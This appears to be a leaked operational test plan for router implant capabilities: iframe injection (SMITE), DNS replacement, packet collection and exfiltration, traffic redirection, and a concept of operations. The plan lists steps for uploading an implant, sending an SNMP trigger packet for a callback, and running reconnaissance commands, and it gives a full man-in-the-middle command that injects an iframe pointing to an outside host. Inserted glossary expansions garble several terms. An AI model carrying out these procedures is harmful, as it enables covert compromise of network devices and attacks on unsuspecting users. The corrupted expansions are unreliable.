CT Session - complete - Test 1



Sup Failover Testing
Verify state after failover
Install on one SUP and then force failover through IOSApple operating system for small devices command
Install on one SUP and then test crash to cause failover to other SUP
Install on one SUP and then pull active SUP module to cause failover to other SUP


Instlal on new SUPfail back to original and re-install

Fail back to original and re-install


ACE - complete - Test 4
test entering all commands foreseen during op, variety of show commands
test entering commands that don't exist, typos
test entering unsupported non-show commands


SMITE - still seeing print messages, awaiting Xetron - options -ac -sm -t
test that rules can be created/deleted/enabled/disabled with all parameters expected during op - timed rule, max times to affect, max per host
test creating multiple rules at a time
Test creating a rule that targets multiple source hosts to single destination as well as single source to single destination
test that filterbroker can be restarted with active rules, with rules that are inactive, new rules can be entered after restart
test iframe/exploitation of target
Verify that counters increment in CTCounter Terrorism show commands related to SMITE
Run wireshark on target and examen output of SIMTE session
Verify no syslogs, DNSDomain Name System queries or SNMPSimple Network Management Protocol Traps sent during Iframe
verify iframe not injected for traffic that does not match SMITE rule - from other hosts, from target host to different destination, traffic to other ports (test 443)
Use SMITE while pps threshold is reached - verify whether rule is automatically re-enabled
Verify that traffic from other hosts that are not targeted in SMITE rule is not impacted by SMITE rule


DIVRT- still seeing print messages, awaiting Xetron - options -ac -sm -t
test that rules can be created/deleted/enabled/disabled with all parameters expected during op
test creating multiple rules at a time
test that filterbroker can be restarted with active rules, with rules that are inactive, new rules can be entered after restart
test the dns replace ip functionality - to web servers
verify that dns replace ip not executed against traffic that does not match DIVRTDigital Imaging & Video Recovery Team rule - from other hosts, from target host to different desination, traffic to other ports


Packet Collection - options -t, size limits?
test that rules can be created/deleted/enabled/disabled with all parameters expected during op
test creating multiple rules at a time
test that collect can be restarted with active rules, rules that are inactive, new rules can be entered after restart
test an actual packet collection and exfil parse
verify that traffic that does not match the collect rule is not affected


Redirection - complete Test 30 - options -t -sm
test that rules can be created/deleted/enabled/disabled with all parameters expected during op -done
test creating multiple rules at a time - done
test that redir module can be restarted with active rules, rules that are inactive, new rules can be entered after restart - done
test redirection for target to destination - done
verify that traffic is not redirect that does not match redir rule - from other hosts, from target host to different destination, traffic to other ports - done
verify that no traffic punches through to original destination


Performance Testing - Characterize CPU impact of capabilties - underway
impact of SMITE
impact DIVRT
impact of Packet collection
impact of redirection


Ad-Hoc Testing
line cards being taken out/added/reloaded - complete - Test 5

re-attack - complete - Test 3 

Perform system admin commands - complete - Test 12

Add latency - complete - Test 13

Run Stack Scrambler - Complete - multiple

wireshark of comms traffic - complete - test 19

reload device during HG install - complete Test 17

perform system admin during HG upload -  complete Test 18

SP and linecard CPU - complete test 22
input queue buffer checks
test RAA assists dropped when HG uninstalled - complete Test 23
test RAA dropped when packet assist threshold exceeded - complete Test 23
verify if assist for flux 4 ip is present during CTCounter Terrorism session - assist to flux 4 not present

Verify that impersonated host can still get to flx 4 ip and other places
verify assist is dropped once max number of matches occur on smite rule, or time duration expires
Verify CPU impact and impact to other hosts who are browsing to a SMITE rule destination, but do not match smite rule


On-Device OpSec - complete - Test 11

CONOP Testing  

 
CONOP
Designate a host to impersonate when making CTCounter Terrorism session
Verify the IOSApple operating system for small devices version and status of the device - can we do this?
IAC attack through flux nodes, coming out from mgmt network to vlan 1 IP
Upload HG and allow to run for some time to see traffic
Send a trigger packet from flx mgmt host to vlan 1 IP on UDP/161 asking for a callback to webserver flux node using designated impersonated host
ACE Commands to run before Packet Collection or SMITE

show users all- verify no one else logged on
show module - verify state of module 2, verify RP in slot 5 is active, slot 6 is hot
show redundancy switchover - verify last switchover time and reason
show ver - verify uptime and software version of device - can this be done before IAC/HG?  if so, should be done then
show run - verify that the configuration hasn't changed - VLANVirtual Local Area Network interfaces still configured with nat and unicast rpf, logging levels are same, acls, verify last time config was saved
show proc cpu hist - verify CPU utilization of RP
show history all - verify what commands have been run lately
show log - verify any log messages, error conditions, acl log entries, lack of acl log entries.
show arp - verify hosts in arp table
show ip nat stat - verify how many NATNetwork Address Translation translations are active
show ip nat trans - collect information on NATNetwork Address Translation flows - identify DNSDomain Name System servers in use for VLANVirtual Local Area Network 19, identify unique active hosts, identify destination web pages on port 80
show ip route - verify OSPFOpen Shortest Path First routes
show int vlan 2 - how much traffic currently to/from uplinks
show int vlan 19 - how much traffic currently to/from customer of interest

Before attack, check packet assist threshold value - packet get_assist_threshold_status.  Note that if packet assist threshold is reached, assists for SMITE will be dropped silently.
Choose a client(s)/server to iframe inject.    Ideally, could identify a host you want to SMITE and a destination that only that host tends to go to on port 80.  Create a rule that will add the iframe for a limited amount of time, and a limited total number of times per host if executing against a range of clients and overall limit.  These flags should be:
mitm create http_iframe 10.11.0.10 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -ac 2 -sm 2 -t 60s -en -bc -bk
At this point, all traffic to X.X.X.XX (LVLT-GOGL-8-8-8[US]) is being promoted - run packet get_assist_threshold_status to verify maximum pps sent.  Rule will be disabled after 60 seconds.
